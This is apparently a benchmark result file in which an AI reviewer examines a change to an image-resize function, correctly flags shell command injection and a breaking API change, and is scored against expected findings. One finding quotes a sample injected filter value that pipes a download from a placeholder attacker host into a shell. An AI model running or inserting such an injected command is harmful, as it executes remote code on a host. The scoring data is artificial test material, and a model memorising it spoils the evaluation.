@@ -1,0 +1,57 @@
+{
+  "case": "C070",
+  "pr": "C070",
+  "repo": "fixture",
+  "provider": "grok",
+  "api_base": "",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "426aa0eb574d",
+  "turns": 3,
+  "tool_calls": null,
+  "seconds": 36.4,
+  "setup_seconds": 0.0,
+  "total_seconds": 36.4,
+  "usage": {
+    "in": 28913,
+    "cache_read": 55296,
+    "cache_write": 0,
+    "out": 1551,
+    "source": "cli"
+  },
+  "cost_usd": 0.0837208,
+  "changed_files": [
+    "src/images/resize.ts"
+  ],
+  "findings": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity": "critical",
+      "body": "**Command injection:** `exec()` runs the template through a shell, and both `src` and `filter` are interpolated without safe escaping.\n\nFailure mode: a caller-controlled `filter` such as `Lanczos; curl attacker.test/exfil | sh` (or `src` containing `\"; malicious; #`) executes arbitrary commands on the host with the process privileges. Double-quoting `src` does not stop breakout via embedded quotes, backticks, or `$(...)`.\n\nThe comment that `-filter` \"needs a shell\" is incorrect \u2014 ImageMagick accepts the filter as a normal argv token. Keep `execFile` / `spawn` with `shell: false`:\n\n```suggestion\n    execFile(\"convert\", [src, \"-filter\", filter, \"-resize\", `${w}x`, \"/tmp/out.png\"], (e) => e ? rej(e) : res(\"/tmp/out.png\"));\n```\n\nAlso restore `import { execFile } from \"child_process\";`. If filters must be restricted, allowlist known ImageMagick filter names before invoking convert."
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 3,
+      "severity": "warning",
+      "body": "**Breaking API change:** `filter` is inserted as the second parameter, shifting `w` from position 2 to 3.\n\nFailure mode: existing callers of `resize(src, w)` now pass the width as `filter` and leave `w` as `undefined`, producing invalid `-resize undefinedx` invocations (and, with the shell path above, a confused attack surface).\n\nPrefer an options object or append `filter` as an optional last argument with a safe default (e.g. `Lanczos`) so positional callers keep working:\n\n```ts\nexport function resize(src: string, w: number, filter: string = \"Lanczos\"): Promise<string>\n```"
+    }
+  ],
+  "summary": "## Verdict\n\n**Do not merge** \u2014 this change introduces shell command injection by switching from `execFile` to `exec` and interpolating untrusted `src` / `filter` into a shell string.\n\n## Findings\n\n| # | Severity | File | Summary |\n|---|----------|------|---------|\n| 1 | \ud83d\udea8 critical | `src/images/resize.ts:6` | Command injection via `exec` string interpolation of `src` and `filter` |\n| 2 | \u26a0\ufe0f warning | `src/images/resize.ts:3` | Public API signature change inserts `filter` before `w`, breaking existing callers |\n\n## Notes\n\nImageMagick `-filter` accepts a discrete filter name (e.g. `Lanczos`, `Mitchell`). User-composed values do not require a shell; pass them as a discrete argv element with `execFile` / `spawn` (`shell: false`). Quoting `\"${src}\"` does not make shell interpolation safe \u2014 a path containing `\"` or `` ` `` still breaks out of the double-quoted segment.\n\n**Recommendation:** request-changes\n",
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C070-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
